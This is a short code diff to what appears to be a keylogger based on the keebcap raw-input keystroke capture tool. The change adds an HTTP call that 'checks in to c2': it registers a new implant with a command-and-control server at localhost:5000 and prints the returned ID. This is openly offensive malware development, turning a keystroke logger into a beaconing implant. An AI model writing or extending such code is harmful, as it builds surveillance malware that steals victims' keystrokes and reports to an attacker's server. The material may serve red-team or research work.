@@ -4,6 +4,7 @@
  * https://github.com/synacktiv/keebcap.
  *
  */
+#include "httpclient.h"
 #include "process.h"
 #include <signal.h>
 #include <stdio.h>
@@ -44,7 +45,13 @@ void sig_handler(int signal) {
 }
 
 int main(int ac, char **av) {
-  fprintf(stderr, "> starting..\n");
+  fprintf(stderr, "> starting...\n");
+  fprintf(stderr, "> checking in to c2...\n");
+  DWORD stOut = 0;
+  // request type, server, uri, port, UA, useless other stuff
+  LPBYTE id = HTTPRequest(L"GET", L"localhost", L"/api/new/implant", 5000,
+                          L"sup", NULL, 0, &stOut, 0, NULL, 0);
+  printf("%s\n", id);
 
   // define a window class which is required to receive RAWINPUT events
   WNDCLASSEX wc;
